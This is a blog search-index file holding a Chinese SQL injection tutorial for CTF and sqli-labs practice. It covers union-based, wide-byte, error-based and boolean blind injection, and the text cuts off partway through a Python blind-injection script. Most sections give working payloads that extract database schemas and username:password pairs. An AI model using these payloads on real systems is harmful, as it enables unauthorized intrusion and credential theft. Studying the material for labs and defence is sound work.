<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入之(二)</title>
      <link href="/2024/10/22/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F(%E4%BA%8C)/"/>
      <url>/2024/10/22/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SQL注入——几种常见的注入方式-二"><a href="#SQL注入——几种常见的注入方式-二" class="headerlink" title="SQL注入——几种常见的注入方式(二)"></a>SQL注入——几种常见的注入方式(二)</h1><blockquote><p>因为知识琐碎，一些知识无法系统的罗列起来，所以对一些常见的注入方式进行了汇总、梳理，涵盖了大部分的前置知识，但是碎的知识只能整理成这样了，凑合看吧😂</p></blockquote><h2 id="根据注入方式来注入-1"><a href="#根据注入方式来注入-1" class="headerlink" title="根据注入方式来注入(1)"></a>根据注入方式来注入(1)</h2><h3 id="1-GET注入"><a href="#1-GET注入" class="headerlink" title="1. GET注入"></a>1. GET注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注!:使用Get方式传参时,对于客户端,#会被当做命令执行而不是直接解析,同时空格也会被忽略掉,但对于服务端没有影响,因此尽量使用--+号,在使用get方法sql注入时</span><br></pre></td></tr></table></figure><hr><h3 id="2-POST注入"><a href="#2-POST注入" class="headerlink" title="2. POST注入"></a>2. POST注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在进行post注入时,可以使用#和--空格,而使用--+将无法解析为注释</span><br></pre></td></tr></table></figure><hr><h3 id="3-cookie注入"><a href="#3-cookie注入" class="headerlink" title="3. cookie注入"></a>3. cookie注入</h3><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221623857.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当第一次访问网页是不会发送cookie,第二次访问却会,cookie更像你访问网站的历史记录,记录着你的各种信息(如喜好,账号密码...等)</span><br></pre></td></tr></table></figure><p>找到注入点</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221626942.png"></p><p>例如<strong>sqli-labs的less20</strong></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221629853.png"></p><hr><h3 id="4-http头注入"><a href="#4-http头注入" class="headerlink" title="4. http头注入"></a>4. http头注入</h3><p>如<code>UA</code>头注入(user-agent)</p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221633598.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221633179.png" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用xpath_string函数报错从而获得信息;后面的or &#x27;1&#x27;=&#x27;1是用来闭合user-agent后的单引号的</span><br></pre></td></tr></table></figure><h2 id="根据注入方式来注入-2"><a href="#根据注入方式来注入-2" class="headerlink" title="根据注入方式来注入(2)"></a>根据注入方式来注入(2)</h2><hr><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>联合查询是一个常用的函数，在很多比赛里都会被ban掉，因此我们在这里简单了解下即可</p><h4 id="相关语法知识"><a href="#相关语法知识" class="headerlink" title="相关语法知识"></a>相关语法知识</h4><ul><li><code>UNION</code>可以将前后两个查询结果拼接到一起，并且自动去重</li><li><code>UNION ALL</code>功能相同，但是会显示所有数据，不会去重</li></ul><p>有类似功能的还有<code>JION</code>但他是对库表进行连接操作的语句，我们先在前面简单提及，后面的<strong>绕过</strong>中我们会详细讲解相关操作</p><h4 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h4><ol><li><p>判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure></li><li><p>猜测SQL查询语句中的字段数</p><ul><li>使用 <strong>order&#x2F;group by</strong> 语句，通过往后边拼接数字指导页面报错，可确定字段数量。</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br></pre></td></tr></table></figure><ul><li>使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure><ol start="3"><li><p>确定显示数据的字段位置，使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。</li><li>⼀定要拼接够足够的字段数，否则SQL语句报错。</li></ul></blockquote><ol start="4"><li><p>在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于：</p><ul><li><p>获取当前数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取表中的字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+</span><br></pre></td></tr></table></figure><p>一般情况下就是这样的一个顺序：</p><p><code>确定联合查询的字段数-&gt;确定联合查询回显位置-&gt;爆库-&gt;爆表-&gt;爆字段-&gt;爆数据</code></p></li></ul></li></ol><p><em>这里还使用了<code>group_concat()</code>函数来拼接多个查询，很多查询操作中都有这个函数，提高查询效率，并且可以拼接特殊字符来进行分割，同时使用了之前讲到的<code>information_schema</code>库来获取表、字段的信息，低版本并不存在这个库，同时很多题也会过滤这个库，我们之后也会讲到其他库是如何使用的</em></p><hr><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote><p>出现条件:1.数据库使用的是GBK编码<br>         2.PHP编码为UTF-8</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222209999.png"></p><p><strong>原因：</strong><br>1.现在大多数的网站对于SQL注入都做了一定的方法，例如使用一些Mysql中转义的函数<code>addslashes</code>,<code>mysql_real_escape_string</code>,<code>mysql_escape_string</code>等，还有一种是配置<code>magic_quote_gpc</code>,不过PHP高版本已经移除此功能。其实这些函数就是为了过滤用户输入的一些数据，对特殊的字符加上反斜杠<code>\</code>进行转义。<br>2.网站开启了<code>magic_quote_gpc</code>,或者使用了上面的转义函数数据库设置成gbk编码（不是html编码<br>3.在编码中，gbk编码占用2个字符，asc‖占用1个字符，攻击者恶意构造，把asc字符吃掉，就能进行下一步攻击</p><hr><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="相关语法知识-1"><a href="#相关语法知识-1" class="headerlink" title="相关语法知识"></a>相关语法知识</h4><p><em>报错注入的思路就在，利用我们的特定的查询指令或者sql函数被执行，从而构造一些特定函数的报错进行内容回显，报错的过程可能会出现在查询或者插入甚至删除的过程中</em></p><h4 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h4><h5 id="0x01-Updatexml-XML-document-XPath-string-new-value"><a href="#0x01-Updatexml-XML-document-XPath-string-new-value" class="headerlink" title="0x01 Updatexml(XML_document, XPath_string, new_value)"></a>0x01 Updatexml(XML_document, XPath_string, new_value)</h5><ul><li><p>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc</p></li><li><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。这里给一张图来简单了解下<code>Xpath</code><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221706514.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div[1]</span><br></pre></td></tr></table></figure><p>复制下来是这样子的，就可以把HTML理解成Linux的文件结构，里面的标签你可与理解成一个一个的文件夹，他们之间具有父子关系。</p></li><li><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p></li></ul><p>作用：改变文档中符合条件的节点的值</p><p>由于<code>updatexml</code>的第二个参数需要<code>Xpath</code>格式的字符串，如果不符合<code>xml</code>格式的语法，就可以实现报错注入了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>通过这样一段代码，就构成了我们的报错注入，因为第二个参数不符合标准同时也会执行我们的恶意语句<code>(select user())</code>因此在报错信息里，会把我们的<code>用户</code>信息给回带出来</p><h5 id="0x02-extractvalue"><a href="#0x02-extractvalue" class="headerlink" title="0x02 extractvalue()"></a>0x02 extractvalue()</h5><p><code>extractvalue()</code>和<code>updatexml()</code>函数类似，只不过他只有两个参数，用起来和<code>updatexml()</code>差不多</p><p>第二个参数和<code>updatexml()</code>一样xml，文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))</span><br></pre></td></tr></table></figure><h5 id="0x03-exp-x"><a href="#0x03-exp-x" class="headerlink" title="0x03 exp(x)"></a>0x03 exp(x)</h5><p>返回 e 的 x 次方,当 数据过大 溢出时报错，即 x &gt; 709</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail=&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))) as asd))--+</span><br></pre></td></tr></table></figure><h5 id="0x04-geometrycollection-mysql-版本5-5"><a href="#0x04-geometrycollection-mysql-版本5-5" class="headerlink" title="0x04 geometrycollection() mysql 版本5.5"></a>0x04 geometrycollection() mysql 版本5.5</h5><p>（1）函数解释：<br> <code>GeometryCollection</code>是由1个或多个任意类几何对象构成的几何对象。<code>GeometryCollection</code>中的所有元素必须具有相同的空间参考系（即相同的坐标系）。</p><p>（2）官方文档中举例的用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</span><br></pre></td></tr></table></figure><p>（3）报错原因：<br> 因为MYSQL无法使用这样的字符串画出图形，所以报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;manage&#x27; limit 0,1)a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23</span><br></pre></td></tr></table></figure><h5 id="0x05-multipoint-mysql-版本5-5"><a href="#0x05-multipoint-mysql-版本5-5" class="headerlink" title="0x05 multipoint() mysql 版本5.5"></a>0x05 multipoint() mysql 版本5.5</h5><p>（1）函数解释：<br> MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。</p><p> （2）报错原因：<br> 同样是因为无法使用字符串画出图形与<code>geometrycollection</code>类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span><br></pre></td></tr></table></figure><h5 id="0x06-polygon"><a href="#0x06-polygon" class="headerlink" title="0x06 polygon()"></a>0x06 polygon()</h5><p>polygon来自希腊。 “Poly” 意味 “many” ， “gon” 意味 “angle”.<br> Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))--+</span><br></pre></td></tr></table></figure><h5 id="0x07-mutipolygon"><a href="#0x07-mutipolygon" class="headerlink" title="0x07 mutipolygon()"></a>0x07 mutipolygon()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))</span><br></pre></td></tr></table></figure><h5 id="0x08-linestring-）"><a href="#0x08-linestring-）" class="headerlink" title="0x08 linestring(）"></a>0x08 linestring(）</h5><p>报错原理：<br> mysql的有些几何函数（  例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span><br></pre></td></tr></table></figure><h5 id="0x09-multilinestring"><a href="#0x09-multilinestring" class="headerlink" title="0x09 multilinestring()"></a>0x09 multilinestring()</h5><p>同上</p><h5 id="0x0a-ST-LatFromGeoHash-（mysql-5-7-x）"><a href="#0x0a-ST-LatFromGeoHash-（mysql-5-7-x）" class="headerlink" title="0x0a ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）"></a>0x0a ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))))a)b))--+</span><br></pre></td></tr></table></figure><h5 id="0x0b-ST-LongFromGeoHash"><a href="#0x0b-ST-LongFromGeoHash" class="headerlink" title="0x0b ST.LongFromGeoHash"></a>0x0b ST.LongFromGeoHash</h5><p>同上 嵌套查询</p><h5 id="0x0c-ST-Pointfromgeohash-mysql-5-7"><a href="#0x0c-ST-Pointfromgeohash-mysql-5-7" class="headerlink" title="0x0c ST_Pointfromgeohash (mysql&gt;5.7)"></a>0x0c ST_Pointfromgeohash (mysql&gt;5.7)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库版本信息</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure><h5 id="0x0d-GTID-MySQL-5-6-X-显错"><a href="#0x0d-GTID-MySQL-5-6-X-显错" class="headerlink" title="0x0d GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)"></a>0x0d GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)</h5><h6 id="0x01-GTID"><a href="#0x01-GTID" class="headerlink" title="0x01 GTID"></a><strong>0x01 GTID</strong></h6><p> GTID是MySQL数据库每次提交事务后生成的一个全局事务标识符，GTID不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p><blockquote><p>GTID的表现形式 -&gt; GTID  &#x3D;source_id:transaction_id其中source_id一般为数据库的uuid，transaction_id为事务ID，从1开始3E11FA47-71CA-11E1-9E33-C80AA9429562:23如上面的GTID可以看出该事务为UUID为3E11FA47-71CA-11E1-9E33-C80AA9429562的数据库的23号事务</p></blockquote><p><strong>GTID集合</strong>(一组全局事务标识符)：<br> GTID集合为多个单GTID和一个范围内GTID的集合，他主要用于如下地方</p><ul><li>gtid_executed 系统变量</li><li>gtid_purged系统变量</li><li>GTID_SUBSET() 和 GTID_SUBTRACT()函数</li></ul><p>格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5</span><br></pre></td></tr></table></figure><h6 id="0X02-函数详解"><a href="#0X02-函数详解" class="headerlink" title="0X02 函数详解"></a><strong>0X02 函数详解</strong></h6><p>GTID_SUBSET() 和 GTID_SUBTRACT() 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p><ol><li>GTID_SUBSET( set1 , set2 ) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)</li><li>GTID_SUBTRACT( set1 , set2 ) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)<br> 正常情况如下</li></ol><blockquote><p>GTID_SUBSET(‘3E11FA47-71CA-11E1-9E33-C80AA9429562:23’,‘3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57’)GTID_SUBTRACT(‘3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57’,‘3E11FA47-71CA-11E1-9E33-C80AA9429562:20-25’)</p></blockquote><h6 id="0x03-注入过程-payload"><a href="#0x03-注入过程-payload" class="headerlink" title="0x03 注入过程( payload )"></a><strong>0x03 注入过程( payload )</strong></h6><p><strong>GTID_SUBSET函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><strong>GTID_SUBTRACT</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>上面是一些常见或者不常见的能够报错注入的函数(其实有些还是很冷门的🤣)，报错注入就是利用这些函数，在我们的查询语句中的这些函数内的某个位置再嵌套一个子查询，利用产生的报错将子查询的结果回显出来，每个报错注入的函数都搭配了网上找到的简单的payload，情况总是在变化，注意一下函数中子查询所在的位置即可。</p><h6 id="使用不存在的函数来报错"><a href="#使用不存在的函数来报错" class="headerlink" title="使用不存在的函数来报错"></a>使用不存在的函数来报错</h6><p>随便使用一个不存在的函数，可能会得到当前所在的数据库名称。</p><h6 id="使用-join-using-报错获取列名"><a href="#使用-join-using-报错获取列名" class="headerlink" title="使用 join using() 报错获取列名"></a>使用 join using() 报错获取列名</h6><ul><li>一般应用于<strong>无列名注入</strong>，下文绕过中会细讲。</li></ul><blockquote><p>通过关键字join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因（相同列名存在），而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p></blockquote><p>下面演示如何通过join…using来获取列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取第一列的列名:</span><br><span class="line">1&#x27; union select * from (select * from users as a join users as b)as c#</span><br><span class="line"></span><br><span class="line"># 使用using()依次获取后续的列名</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id))c#</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id,username))c#</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id,username,password))c#</span><br><span class="line"># 数据库中as主要作用是起别名, 常规来说as都可以省略，但是为了增加可读性, 不建议省略</span><br></pre></td></tr></table></figure><h5 id="0x11-floor报错注入"><a href="#0x11-floor报错注入" class="headerlink" title="0x11 floor报错注入"></a>0x11 floor报错注入</h5><blockquote><p><strong>floor()报错注入的原因</strong>是   <strong>group by</strong>在向临时表插入数据时，由于   **rand()**多次计算导致插入临时表时主键重复，从而报错，又因为报错前   **concat()**中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或数执行后的结果。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),floor(rand(0)*2) from users group by floor(rand(0)*2)</span><br></pre></td></tr></table></figure><p>当我们输入该sql语句的时候会提示<code>1</code>这个主键重复，这是为什么呢？在讲解之前我们首先要了解一个特性，就是rand()函数的一个特性（**floor(rand(0)*2)第五次执行rand(0)时算出了1，导致插入时主键重复异常**）</p><blockquote><p>这个特性就是   <strong>rand()函数的执行速度</strong>要比   <strong>group by查询并插入key值的速度</strong>更快  </p></blockquote><p>因此，我们就可以在里面夹带我们想要的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(database(),floor(rand(0)*2)) from users group by concat(database(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure><p>简化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(concat(database(),floor(rand(0)*2)))x from users group by x;</span><br></pre></td></tr></table></figure><p>大体的注入流程就是在联合查询不成功的情况下尝试使用报错注入的函数得到回显子查询结果的报错结果。</p><hr><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>SQL  Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取sql语句的执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注，。</p><p>对于基于布尔的盲注，可通过构造真or假判断条件（数据库各项信息取值的大小比较，  如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），  将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果  （True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p><h4 id="用到的SQL语法知识"><a href="#用到的SQL语法知识" class="headerlink" title="用到的SQL语法知识"></a>用到的SQL语法知识</h4><p>会用到截取字符的函数：<code>substr()</code></p><p>可以直接判断字符或者根据ASCII码来判断，利用ASCII码时要用到<code>ASCII()</code>函数来将字符转换为ASCII码值。</p><p>还用到了各种运算符，<code>&lt;</code>，<code>&gt;</code>，<code>=</code>当然不必多提，但是在下面POST的方式中用到了异或符号<code>^</code>，这里其实是一种异或注入的方法，当我们在尝试SQL注入时,发现union,and等一些列的字符被完全过滤掉了,就可以考虑使用异或注入。而异或运算，不仅在sql注入中有用，很多地方如过滤了所有函数等比如命令执行的题，就可以进行异或进行构造，但是运算方式不止一种，我们要根据实际情况去选择，学会变通，才是学习的核心思想</p><blockquote><p>异或运算规则:<br> <code>1^1=0 0^0=0 0^1=1</code><br> <code>1^1^1=0 1^1^0=0</code><br> 构造payload:<code>&#39;^ascii(mid(database(),1,1)=98)^0</code></p></blockquote><p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h5 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a>注入流程</h5><p>首先通过页面对于永真条件<code>or 1=1</code>（true） 与永假条件 <code>and 1=2</code> (false)的返回内容是否存在<code>差异</code>进行判断是否可以进行布尔盲注。</p><p>下面给出常用的布尔盲注脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       #payload = &#x27;http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#x27; %(i,mid)</span><br><span class="line">       payload = &quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)#&quot; %(i,mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                     &quot;id&quot;:payload</span><br><span class="line">                